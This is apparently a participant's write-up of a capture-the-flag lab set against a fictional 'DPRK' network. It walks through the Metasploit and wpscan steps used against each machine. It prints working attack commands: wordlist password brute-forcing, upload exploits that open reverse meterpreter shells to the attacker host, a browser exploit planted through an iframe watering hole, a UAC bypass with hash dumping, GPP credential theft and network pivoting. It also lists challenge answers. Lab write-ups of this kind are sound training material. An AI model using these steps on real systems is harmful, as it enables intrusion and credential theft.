
==PCAP Challenges==

They give you a pcap

Watering Hole 1 - The URL for the North Kiringul Central News Agency's website is www.nkcna.ctf

===PCAP 1===
The IP Address of www.nkcna.ctf is 172.25.45.92

===PCAP 2===
The IP Address of the proxy server is 192.168.51.66

===PCAP 3===
How many unique times has 192.168.51.66 browsed to the NKCNA homepage at http://www.nkcna.ctf/?

213 times.  I used this wireshark filter: ip.src == 192.168.51.66 && http.host == www.nkcna.ctf && http.request.uri == /

===PCAP 4===
Aside from HTTP and DNS, what other unencrypted protocol is found in the PCAP?

FTP.  I used this wireshark filter: ip.src == 192.168.51.66 && !http && !dns

===PCAP 5===
What is the password of the user that logs in to the FTP server?

daebak

===PCAP 6===
Login to the FTP server using the credentials you found in the PCAP.

What is the MD5 hash of the WordPress_Security.pdf file on the server?


Creds: koli/daebak

Hash 873f9e060518b04c85ae59f0fbdbabc9

==Watering Hole Challenges==

Helpful to use `wpscan`. 

`wpscan --url http://www.nkcna.ctf/`

===Watering Hole 3===

What is the version of Wordpress being used? 4.7.2

Output from wpscan

===Watering Hole 4===

What is the username of the person who likely posts the news stories?

nkcna_author

`wpscan --url http://www.nkcna.ctf/ --enumerate u`

===Watering Hole 5===

What is the nkcna_author's cleartext password?

<pre>
[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - nkcna_author / zxcvbnm                                                                                                                                                            
Trying nkcna_author / samsung Time: 00:00:32 <============================================================================================================> (255 / 255) 100.00% Time: 00:00:32
</pre>

`wpscan --url http://www.nkcna.ctf/ -U nkcna_author --passwords /usr/share/wordlists/rockyou.txt --disable-tls-checks`


===Watering Hole 6===

What is the English title of the most recent draft post?

Missile Launch Great Success for Our Glorious Leader

===Watering Hole 7===

What is the name of the Metasploit module that will gain remote code execution?

<pre>
% wpscan --url http://www.nkcna.ctf/ -e vp --plugins-detection aggressive --api-token cuFIUjchD
...

[+] Enumerating Vulnerable Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:02:40 <============================================================================================================> (2315 / 2315) 100.00% Time: 00:02:40
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] all-in-one-seo-pack
 | Location: http://www.nkcna.ctf/wp-content/plugins/all-in-one-seo-pack/
 | Last Updated: 2020-07-15T13:05:00.000Z
 | Readme: http://www.nkcna.ctf/wp-content/plugins/all-in-one-seo-pack/readme.txt
 | [!] The version is out of date, the latest version is 3.6.2
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://www.nkcna.ctf/wp-content/plugins/all-in-one-seo-pack/, status: 200
 |
 | [!] 5 vulnerabilities identified:
 |
 | [!] Title: All in One SEO Pack <= 2.3.6.1 - Unauthenticated Stored Cross-Site Scripting (XSS)
 |     Fixed in: 2.3.7
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8538
 |      - https://seclists.org/fulldisclosure/2016/Jul/23
 |      - https://web.archive.org/web/20160508074631/http://semperfiwebdesign.com/blog/all-in-one-seo-pack/all-in-one-seo-pack-release-history/
 |      - https://sumofpwn.nl/advisory/2016/persistent_cross_site_scripting_in_all_in_one_seo_pack_wordpress_plugin.html
 |      - https://wptavern.com/all-in-one-seo-2-3-7-patches-persistent-xss-vulnerability
 |      - https://www.wordfence.com/blog/2016/07/xss-vulnerability-all-in-one-seo-pack-plugin/
 |
 | [!] Title: All in One SEO Pack <= 2.3.7 -  Unauthenticated Stored Cross-Site Scripting (XSS)
 |     Fixed in: 2.3.8
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8558
 |      - https://www.wordfence.com/blog/2016/07/new-xss-vulnerability-all-in-one-seo-pack/
 |      - https://semperfiwebdesign.com/blog/all-in-one-seo-pack/all-in-one-seo-pack-release-history/
 |      - https://web.archive.org/web/20161019215603/https://semperfiwebdesign.com/blog/all-in-one-seo-pack/all-in-one-seo-pack-release-history/
 |
 | [!] Title: All in One SEO Pack <= 2.9.1.1 - Authenticated Stored Cross-Site Scripting (XSS)
 |     Fixed in: 2.10
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9159
 |      - https://www.ripstech.com/php-security-calendar-2018/#day-4
 |      - https://wordpress.org/support/topic/a-critical-vulnerability-has-been-detected-in-this-plugin/
 |      - https://semperfiwebdesign.com/all-in-one-seo-pack-release-history/
 |
 | [!] Title: All In One SEO Pack < 3.2.7 - Stored Cross-Site Scripting (XSS)
 |     Fixed in: 3.2.7
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9915
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16520
 |      - https://github.com/sbaresearch/advisories/tree/public/2019/SBA-ADV-20190913-04_WordPress_Plugin_All_in_One_SEO_Pack
 |
 | [!] Title: All in One SEO Pack < 3.6.2 - Authenticated Stored Cross-Site Scripting
 |     Fixed in: 3.6.2
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/10320
 |      - https://www.wordfence.com/blog/2020/07/2-million-users-affected-by-vulnerability-in-all-in-one-seo-pack/
 |      - https://www.youtube.com/watch?v=2fqMM6HRV5s
 |
 | Version: 2.3.6.1 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://www.nkcna.ctf/wp-content/plugins/all-in-one-seo-pack/readme.txt

[+] sexy-contact-form
 | Location: http://www.nkcna.ctf/wp-content/plugins/sexy-contact-form/
 | Last Updated: 2015-03-13T21:02:00.000Z
 | Readme: http://www.nkcna.ctf/wp-content/plugins/sexy-contact-form/readme.txt
 | [!] The version is out of date, the latest version is 1.0.0
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://www.nkcna.ctf/wp-content/plugins/sexy-contact-form/, status: 403
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Creative Contact Form <= 0.9.7 Shell Upload
 |     Fixed in: 1.0.0
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/7652
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-8739
 |      - https://www.exploit-db.com/exploits/35057/
 |      - https://packetstormsecurity.com/files/131513/
 |      - https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_creativecontactform_file_upload
 |
 | Version: 0.9.7 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://www.nkcna.ctf/wp-content/plugins/sexy-contact-form/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://www.nkcna.ctf/wp-content/plugins/sexy-contact-form/readme.txt

</pre>


https://wpvulndb.com/vulnerabilities/7652 from above output
`exploit/unix/webapp/wp_creativecontactform_file_upload`

===Watering Hole 8===

Now that we have access, what is WordPress database password in wp-config.php?

<pre>
% msfconsole
msf5 > use exploit/unix/webapp/wp_creativecontactform_file_upload
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf5 exploit(unix/webapp/wp_creativecontactform_file_upload) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Creative Contact Form 0.9.7

msf5 exploit(unix/webapp/wp_creativecontactform_file_upload) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Creative Contact Form 0.9.7

msf5 exploit(unix/webapp/wp_creativecontactform_file_upload) > show options

Module options (exploit/unix/webapp/wp_creativecontactform_file_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     172.25.45.92     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.13.0.151      yes       The listen address (an interface may be specified)
   LPORT  9090             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Creative Contact Form 0.9.7

msf5 exploit(unix/webapp/wp_creativecontactform_file_upload) > exploit

[*] Started reverse TCP handler on 10.13.0.151:9090 
[+] Our payload is at: UaVSzxGiuE.php. Calling payload...
[*] Calling payload...
[*] Sending stage (38288 bytes) to 172.25.45.92
[*] Meterpreter session 1 opened (10.13.0.151:9090 -> 172.25.45.92:42078) at 2020-07-23 11:31:06 -0400
[+] Deleted UaVSzxGiuE.php
ls

meterpreter > ls
Listing: /var/www/html/wp-content/plugins/sexy-contact-form/includes/fileupload/files
=====================================================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  0     fil   2016-08-25 03:09:32 -0400  index.html

</pre>

MoreLikeKimJongFUN

===Watering Hole 9===

What is the full path to where Apache logs web access requests?

'/var/log/apache2/access.log'

===Watering Hole 10===

What is the full path to the setuid binary that will allow us to read the log file?

`find / -perm -u=s -type f 2>/dev/null`

/usr/local/bin/readlog

===Watering Hole 11===

What URL is frequently accessed by a user in the DPRK source IP range?

`/usr/local/bin/readlog /var/log/apache2/access.log`


/submit_story.html

===Watering Hole 12===

What is the target's user-agent string?

Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko

===Watering Hole 13===

What browser are they using?

Internet Explorer 11

===Watering Hole 14===

Based on the user-agent string, what OS version is the target running?

Windows 8.1

===Watering Hole 15===

 Login to your test Window 8.1 VM. What is the default home page set for IE11?


http://www.nkcna.ctf/submit_story.html

===Watering Hole 16===

"What version of Adobe Flash is intalled?"

18.0.0.194

===Watering Hole 17===

"What metasploit module can exploit the installed adobe version?"

exploit/multi/browser/adobe_flash_hacking_team_uaf


===Planner 1===

What is the IP address of the host found?

Open a new terminal window to run a second metasploit module.

<pre>
msf5 > use exploit/multi/browser/adobe_flash_hacking_team_uaf 
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf5 exploit(multi/browser/adobe_flash_hacking_team_uaf) > show options

Module options (exploit/multi/browser/adobe_flash_hacking_team_uaf):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Retries  true             no        Allow the browser to retry the module
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.2.120    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows


msf5 exploit(multi/browser/adobe_flash_hacking_team_uaf) > set LHOST 10.13.0.151
LHOST => 10.13.0.151
msf5 exploit(multi/browser/adobe_flash_hacking_team_uaf) > set SRVHOST 10.13.0.151
SRVHOST => 10.13.0.151
msf5 exploit(multi/browser/adobe_flash_hacking_team_uaf) > 
msf5 exploit(multi/browser/adobe_flash_hacking_team_uaf) > 
msf5 exploit(multi/browser/adobe_flash_hacking_team_uaf) > 
msf5 exploit(multi/browser/adobe_flash_hacking_team_uaf) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Windows
   1   Linux


msf5 exploit(multi/browser/adobe_flash_hacking_team_uaf) > set target 0
target => 0
msf5 exploit(multi/browser/adobe_flash_hacking_team_uaf) > run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.13.0.151:4444 
msf5 exploit(multi/browser/adobe_flash_hacking_team_uaf) > [*] Using URL: http://10.13.0.151:8080/VIKfXc4aGma1bJ6
</pre>

In one terminal window running the initial metasploit module, edit submit_story.html with an iframe that refers to the URI given by the adobe module above.

Sessions will connect to that second module:

<pre>

[-] Unknown command: session.
msf5 exploit(multi/browser/adobe_flash_hacking_team_uaf) > sessions

Active sessions
===============

  Id  Name  Type                     Information                  Connection
  --  ----  ----                     -----------                  ----------
  6         meterpreter x86/windows  DPRK\choe.hang-na @ PLANNER  10.13.0.151:4444 -> 192.168.51.66:49450 (192.168.100.10)

msf5 exploit(multi/browser/adobe_flash_hacking_team_uaf) > sessions -i 6
[*] Starting interaction with 6...

meterpreter > 
meterpreter > 
meterpreter > ls
Listing: C:\Users\choe.hang-na\Desktop
======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  1674  fil   2017-02-24 15:26:02 -0500  Excel.lnk
100666/rw-rw-rw-  1694  fil   2017-02-24 15:26:08 -0500  Word.lnk
100666/rw-rw-rw-  282   fil   2017-02-21 03:09:43 -0500  desktop.ini

meterpreter > ipconfig

Interface  1
============
Name         : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface  3
============
Name         : Intel(R) 82574L Gigabit Network Connection
Hardware MAC : 50:57:4e:17:01:01
MTU          : 1500
IPv4 Address : 192.168.100.10
IPv4 Netmask : 255.255.255.0


Interface  4
============
Name         : Microsoft ISATAP Adapter
Hardware MAC : 00:00:00:00:00:00
MTU          : 1280
IPv6 Address : fe80::5efe:c0a8:640a
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
</pre>

Pro Tip 1: We will be doing quite a bit of work in this network and will need some help. If you haven't already, help your teammates gain access to the network and divide/conquer on the machines. We suggest adding multiple iframes, one pointing to each of your teammate's tap0 IP address then have them run their own exploit to get shells.

use exploit/multi/browser/adobe_flash_hacking_team_uafset SRVPORT 80set URIPATH /set payload windows/meterpreter/reverse_tcpset LHOST <YOUR tap0 IP Address>runmeterpreter> psmeterpreter> migrate


Pro Tip 2: You will continue to exploit the browser and get additional shells each time the victim browses to the web page. You can turn off exploitation by killing the task with kill -K
Pro Tip 3: When exploiting a user process like a web browser, you will lose your session if they close it. You can migrate your meterpreter to a more stable process.
Pro Tip 4: To pivot and route to IPs in this network you need to run autoroute in your session. Metasploit Pivoting Guide
Pro Tip 5: Lots of future hints can be saved by reviewing the read ahead occasionally when stuck.

```
meterpreter > run post/windows/manage/migrate
meterpreter > run post/multi/manage/autoroute
```

==KPASRF Challenges==

===KPASRF 1===

The IP Address of kpasrf.dprk.ctf is 192.168.51.66

dig @192.168.51.1 kpasrf.dprk.ctf

===KPASRF 2===
How many TCP ports are open on this IP address?

2

nmap 192.168.51.66

===KPASRF 3===
Enumerate the FTP service for vulnerabilities.

What is a valid username that can upload files to the server?

anonymous

<pre>nmap -sV -sC 192.168.51.66 -p 21
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-23 10:02 EDT
Nmap scan report for 192.168.51.66
Host is up (0.020s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxrwxrwx   1 owner    group              49 Apr 27  9:49 NOTICE.txt [NSE: writeable]
| ftp-syst: 
|_  SYST: Windows_NT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.03 seconds</pre>

===KPASRF 4===
Let's enumerate the web server for vulnerabilites.

What version of IIS is the web server running?

8.0

<pre>nmap -sV -sC 192.168.51.66 -p 80
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-23 10:07 EDT
Nmap scan report for 192.168.51.66
Host is up (0.021s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 8.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND DELETE MOVE PROPPATCH MKCOL PUT
|_http-server-header: Microsoft-IIS/8.0
|_http-svn-info: ERROR: Script execution failed (use -d to debug)
|_http-title: Kiringul People's Army - Strategic Rocket Forces
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL
|   WebDAV type: Unknown
|   Server Date: Thu, 23 Jul 2020 14:07:18 GMT
|   Server Type: Microsoft-IIS/8.0
|   Exposed Internal IPs: 
|     192.168.51.66
|   Directory Listing: 
|     http://192.168.51.66/
|     http://192.168.51.66/App_Data/
|     http://192.168.51.66/aspnet_client/
|     http://192.168.51.66/bin/
|     http://192.168.51.66/index.html
|     http://192.168.51.66/kpasrf.jpg
|_    http://192.168.51.66/web.config
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.76 seconds</pre>

===KPASRF 5===
What administration module is enabled on this webserver, which could allow a remote user to upload or modify files?

WebDAV

===KPASRF 6===
What is the name of a Metasploit module that could exploit one of the discovered flaws in this webserver?

iis_webdav_upload_asp

===RECON 1===
Exploit onto the KPASRF webserver and get a shell.

What is the contents of the text file in the C:\ directory?

"This machine to be decomissioned on April 1 2014."

Use iis_webdav_upload_asp as described here: https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/iis/iis_webdav_upload_asp.md

Steps in msfconsole:

<pre>> use exploit/windows/iis/iis_webdav_upload_asp
> set payload windows/meterpreter/reverse_tcp
> set RHOST 192.168.51.66
> set LHOST 10.13.0.150
> exploit</pre>

==RECON Challenges==

===Recon 2===
What domain is this machine a part of?

DPRK.CTF

run systeminfo from meterpreter

===Recon 3===
Including the machine that you're currently on, how many hosts are in the 192.168.100.0/24 subnet

7 (not counting the .255 entry below, I guess?)

<pre>meterpreter > run post/windows/gather/arp_scanner RHOSTS=192.168.100.0/24

[*] Running module against KPASRF-INTERNET
[*] ARP Scanning 192.168.100.0/24
[+]     IP: 192.168.100.1 MAC 00:50:56:bd:b2:00 (VMware, Inc.)
[+]     IP: 192.168.100.15 MAC 50:57:4e:17:01:02 (UNKNOWN)
[+]     IP: 192.168.100.10 MAC 50:57:4e:17:01:01 (UNKNOWN)
[+]     IP: 192.168.100.20 MAC 50:57:4e:17:01:04 (UNKNOWN)
[+]     IP: 192.168.100.25 MAC 50:57:4e:17:01:03 (UNKNOWN)
[+]     IP: 192.168.100.240 MAC 50:57:4e:17:01:0a (UNKNOWN)
[+]     IP: 192.168.100.250 MAC 50:57:43:17:01:05 (UNKNOWN)
[+]     IP: 192.168.100.255 MAC 50:57:4e:17:01:0a (UNKNOWN)</pre>

===Recon 4===
What is the IP of the domain controller?

192.168.100.250

run post/windows/gather/enum_domains

===Recon 5===
What operating system is the domain controller running?

Windows 2012 R2 Standard

<pre>meterpreter > run autoroute -s 192.168.100.0/24
meterpreter > background
msf5 exploit(windows/iis/iis_webdav_upload_asp) > use auxiliary/scanner/smb/smb_version
msf5 auxiliary(scanner/smb/smb_version) > set RHOSTS 10.13.0.150
msf5 auxiliary(scanner/smb/smb_version) > run</pre>

===Developer 1===
What is the IP address of the developer's machine?

192.168.100.15

I used nslookup from meterpreter

===Recon 6===
What is the IP address of the administrator's machine?

192.168.100.25

===Recon 7===
What is the IP address of the Glorious Leader's machine?

192.168.100.20

===Recon 8===
Local admin is dprkadmin

use post/windows/gather/enum_logged_on_users

===Administrator 1===

we know the logged on user is a member of the local administrators group:

<pre>C:\Users\choe.hang-na\Desktop>net localgroup administrators
net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
DPRK\choe.hang-na
dprkadmin
The command completed successfully.</pre>

Use a UAC bypass to get system, then dump hashes:

<pre>use exploit/windows/local/bypassuac_eventvwr
set payload windows/meterpreter/reverse_tcp
set target 0
set lhost 10.13.0.150
exploit</pre>

You should get a new session.  Connect to it and run:

<pre>getsystem
run post/windows/gather/hashdump</pre>

Hash is c7823c16ddd435c49decf92a8d54058f

===Recon 9===
What is local admin password (in clear text)?

Password: i_see_ur_cpassword

<pre>use post/windows/gather/credentials/gpp
set session 1
set domains DPRK
exploit</pre>

==Developer==

===Developer 2===
What is the application running on port 80 of the developer's machine?

Jupyter

meterpreter > portfwd add -l 8080 -p 80 -r 192.168.100.15

Open a web browser and go to localhost:8080

===Developer 3===
What is the full path to the tlc.py file shown in Jupyter?

C:\Users\lee.tonghyon\Projects\tlc_jupyter\code

Open a Jupyter notebook and run this: 

<pre>import os
print os.getcwd()</pre>

===Developer 4===
What is the MD5 of the zip containing the most recent launch code release?

8bed361cf06ae70c2078e136d6f35aa5

Run this in the python notebook:

<pre>import os
import sys
import subprocess

#print os.popen("dir C:\\Users\\lee.tonghyon\\Documents").read()
print os.popen("copy C:\\Users\\lee.tonghyon\\Documents\\TLC_release_v1.2.zip C:\\Users\\lee.tonghyon\\Projects\\tlc_jupyter\\code").read()</pre>

===Developer 5===
What is the domain name of the production MQTT endpoint?

mqtt.dprk.ctf

Unzip the release, look at the config file.

===Developer 6===
enter a valid turret move command payload using the latitude and longitude coordinates from the first test launch location found on the PLANNER machine.

missile/control/commands34:move:39.271767,127.625128:0615569d

Run the script and use wireshark

==Planner==

===Planner 2===
What is the username of the account?

choe.hang-na

===PTZ Camera 1===

What internal/private IP has this user browsed recently?

<pre>

meterpreter > run post/windows/manage/migrate
meterpreter > run post/multi/manage/autoroute
meterpreter > shell
[*] 192.168.100.10 - Meterpreter session 92 closed.  Reason: Died



reg query "HKCU\Software\Microsoft\Internet Explorer\TypedURLs"
Process 4756 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\choe.hang-na\AppData\Roaming\Microsoft\Windows\Recent>
C:\Users\choe.hang-na\AppData\Roaming\Microsoft\Windows\Recent>
C:\Users\choe.hang-na\AppData\Roaming\Microsoft\Windows\Recent>
C:\Users\choe.hang-na\AppData\Roaming\Microsoft\Windows\Recent>reg query "HKCU\Software\Microsoft\Internet Explorer\TypedURLs"

HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\TypedURLs
    url1    REG_SZ    http://chrome.google.com/
    url2    REG_SZ    http://google.com/
    url3    REG_SZ    http://firefox.com/
    url4    REG_SZ    http://pastebin.com/m0PAk4ri
    url5    REG_SZ    http://192.168.51.66:21042/
    url6    REG_SZ    http://192.168.102.70/
    url7    REG_SZ    https://www.nkcna.ctf/submit_story.html
</pre>

192.168.102.70


===Planner 3===

What recent document was edited?

<pre>
meterpreter > ls
Listing: C:\Users\choe.hang-na\AppData\Roaming\Microsoft\Office\Recent
======================================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  649   fil   2017-02-28 21:05:57 -0500  SimulationAndTestData.LNK
100666/rw-rw-rw-  94    fil   2017-02-24 15:25:10 -0500  index.dat

meterpreter > cat SimulationAndTestData.LNK
L�F� *�M0��
P�O� �:i�+00�/C:\\1wP�HIDEFI~1D	�aJP�.�M"��hidefiles�2�DaJ� SIMULA~1.XLSf	�aJ�aJ�.�N�qSimulationAndTestData.xlsxV-U����C:\hidefiles\SimulationAndTestData.xlsx9..\..\..\..\..\..\..\hidefiles\SimulationAndTestData.xlsx`�XplanneryT���D���MG�X�e��<����QPWNyT���D���MG�X�e��<����QPWN
</pre>

===Planner 4===

What was the latitude and longitude of their first test launch target? (Format: latitude, longitude)

39.271767, 127.625128

===Planner 5===

Trilaterate the source of the missiles.
39.0458535576, 125.762142247
